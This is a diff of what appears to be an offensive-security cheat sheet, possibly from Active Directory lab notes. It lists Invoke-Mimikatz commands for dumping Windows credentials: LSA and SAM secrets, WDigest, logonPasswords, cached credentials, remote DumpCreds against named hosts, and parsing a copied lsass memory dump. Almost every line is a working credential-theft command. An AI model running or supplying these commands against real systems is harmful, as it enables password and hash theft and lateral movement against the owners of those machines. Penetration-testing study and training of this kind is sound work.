@@ -187,7 +187,9 @@ Invoke-Mimikatz -Command lsadump::lsa /patch  //local accounts
 Invoke-Mimikatz -Command sekurlsa::wdigest
 Invoke-Mimikatz -Command sekurlsa::credman sekurlsa::credman
 <strong>Invoke-Mimikatz -Command sekurlsa::logonPasswords full
+</strong><strong>
 </strong>
+
 <strong>Invoke-Mimikatz -command lsadump::cache
 </strong>Invoke-Mimikatz -command lsadump::sam
 Invoke-Mimikatz -command lsadump::secrets
@@ -197,6 +199,9 @@ Invoke-Mimikatz -DumpCreds   //default parameter
 <strong>
 </strong><strong>Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
 </strong><strong>
+</strong><strong>When lsass.dump is copied, local:
+</strong>sekurlsa::minidump C:\AD\Tools\lsass.DMP
+<strong>
 </strong><strong>When .exe run first:
 </strong>privilege::debug
 token::elevate
